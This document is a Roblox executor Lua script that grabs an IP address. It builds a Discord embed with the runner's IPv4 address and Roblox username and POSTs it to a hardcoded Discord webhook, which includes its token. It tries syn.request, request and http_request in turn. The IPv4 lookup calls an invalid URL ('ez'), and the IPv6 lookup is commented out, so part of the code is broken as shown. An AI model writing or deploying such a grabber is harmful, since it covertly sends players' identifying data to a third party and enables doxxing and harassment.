local webh = "https://discord.com/api/webhooks/937518454750212166/fSlfu_f1KWYju7yjGquCUsTlVnmFA6V2HJR1UL3xOgZeHLtkgRevu-hG-kMLiXL6qZJM"
local data = {
    ["embeds"] = {
        {
            ["color"] = tonumber(0xf0535a),
            ["title"] = "SUCCESSFULLY GRABBED IP ADDRESS",
            ["fields"] = {
                {
                    ["name"] = "IPV4 ADDRESS",
                    ["value"] = game:HttpGet("ez"),
                },
                {
                    ["name"] = "IPV6 ADDRESS",
                    ["value"] = "nil", --game:HttpGet("https://api64.ipify.org"),
                },
                {
                    ["name"] = "ROBLOX USERNAME",
                    ["value"] = game:GetService("Players").LocalPlayer.Name,
                }
            }
        }
    }
}

if syn then
    local response = syn.request(
        {
            Url = webh,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
    );
elseif request then
    local response = request(
        {
            Url = webh,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
    );
elseif http_request then
    local response = http_request(
        {
            Url = webh,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
    );
end
